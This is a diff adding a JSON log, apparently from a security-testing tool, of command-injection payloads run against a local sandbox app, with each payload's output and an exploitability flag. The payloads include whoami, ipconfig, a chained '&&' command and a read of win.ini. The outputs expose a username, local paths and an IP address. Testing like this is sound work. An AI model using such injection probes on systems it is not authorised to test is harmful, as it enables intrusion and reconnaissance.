@@ -1,0 +1,66 @@
+[
+  {
+    "timestamp": "2026-07-07T18:56:32.693600Z",
+    "payload_name": "basic_echo",
+    "payload": "echo AEGIS_BREACH_OK",
+    "output": "AEGIS_BREACH_OK\n",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:34.799919Z",
+    "payload_name": "dir_listing",
+    "payload": "dir src",
+    "output": " Volume in drive C is OS\n Volume Serial Number is C825-2D54\n\n Directory of C:\\Users\\sagni\\Desktop\\Aegis\\src\n\n08-07-2026  00:23    <DIR>          .\n08-07-2026  00:22    <DIR>          ..\n08-07-2026  00:22    <DIR>          agents\n08-07-2026  00:22    <DIR>          patches\n08-07-2026  00:23    <DIR>          sandbox_target\n08-07-2026  00:22                 0 __init__.py\n08-07-2026  00:23    <DIR>          __pycache__\n               1 File(s)              0 bytes\n               6 Dir(s)  158,264,6",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:37.011731Z",
+    "payload_name": "whoami",
+    "payload": "whoami",
+    "output": "sagnikd\\sagni\n",
+    "status_code": 200,
+    "exploitable": false
+  },
+  {
+    "timestamp": "2026-07-07T18:56:39.252509Z",
+    "payload_name": "ipconfig",
+    "payload": "ipconfig",
+    "output": "\nWindows IP Configuration\n\n\nWireless LAN adapter Local Area Connection* 1:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nWireless LAN adapter Local Area Connection* 2:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nWireless LAN adapter Wi-Fi:\n\n   Connection-specific DNS Suffix  . : \n   IPv6 Address. . . . . . . . . . . : 2405:201:800b:d026:8a15:9af:f8a4:20e6\n   Temporary IPv6 Address. . . .",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:41.335764Z",
+    "payload_name": "read_file",
+    "payload": "type C:\\Windows\\win.ini",
+    "output": "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:43.438464Z",
+    "payload_name": "chain_exec",
+    "payload": "echo start && dir && echo end",
+    "output": "start \n Volume in drive C is OS\n Volume Serial Number is C825-2D54\n\n Directory of C:\\Users\\sagni\\Desktop\\Aegis\n\n08-07-2026  00:22    <DIR>          .\n08-07-2026  00:23    <DIR>          ..\n08-07-2026  00:22               232 .gitignore\n08-07-2026  00:22    <DIR>          data\n08-07-2026  00:22             1,011 README.md\n08-07-2026  00:22                76 requirements.txt\n08-07-2026  00:26    <DIR>          scripts\n08-07-2026  00:23    <DIR>          src\n08-07-2026  00:22    <DIR>          test",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:45.620962Z",
+    "payload_name": "ping_test",
+    "payload": "ping -n 1 127.0.0.1",
+    "output": "\nPinging 127.0.0.1 with 32 bytes of data:\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\n\nPing statistics for 127.0.0.1:\n    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n",
+    "status_code": 200,
+    "exploitable": true
+  },
+  {
+    "timestamp": "2026-07-07T18:56:47.725474Z",
+    "payload_name": "recursive_dir",
+    "payload": "dir /s /b src\\sandbox_target",
+    "output": "C:\\Users\\sagni\\Desktop\\Aegis\\src\\sandbox_target\\app.py\nC:\\Users\\sagni\\Desktop\\Aegis\\src\\sandbox_target\\__init__.py\nC:\\Users\\sagni\\Desktop\\Aegis\\src\\sandbox_target\\__pycache__\nC:\\Users\\sagni\\Desktop\\Aegis\\src\\sandbox_target\\__pycache__\\app.cpython-313.pyc\nC:\\Users\\sagni\\Desktop\\Aegis\\src\\sandbox_target\\__pycache__\\__init__.cpython-313.pyc\n",
+    "status_code": 200,
+    "exploitable": true
+  }
+]
